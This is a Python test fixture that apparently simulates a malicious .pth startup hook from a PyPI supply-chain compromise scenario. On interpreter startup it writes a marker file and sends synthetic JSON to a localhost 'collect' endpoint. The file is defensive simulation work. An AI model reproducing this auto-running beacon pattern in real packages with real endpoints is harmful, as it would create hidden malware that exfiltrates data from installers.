"""
Loaded via a .pth file in site-packages (interpreter startup), modelling 1.82.8-style behavior.
Only contacts localhost; only synthetic JSON.
"""

from __future__ import annotations

import json
import os
import urllib.error
import urllib.request
from pathlib import Path


def _pth_startup() -> None:
    if os.environ.get("TESTBENCH_MODE") != "enabled":
        return
    if os.environ.get("TESTBENCH_OFFLINE") == "1":
        return

    marker = Path.cwd() / ".testbench-litellm-pth.json"
    try:
        marker.write_text(
            json.dumps(
                {
                    "scenario": "22-litellm-pypi-compromise",
                    "phase": "pth-startup",
                    "hook": "litellm_like_pth_hook",
                },
                indent=2,
            ),
            encoding="utf-8",
        )
    except OSError:
        pass

    payload = json.dumps({"type": "pth-startup", "package": "litellm_like", "version": "1.82.8"}).encode("utf-8")
    try:
        urllib.request.urlopen("http://127.0.0.1:3022/collect", data=payload, timeout=2)
    except (urllib.error.URLError, OSError):
        pass


_pth_startup()
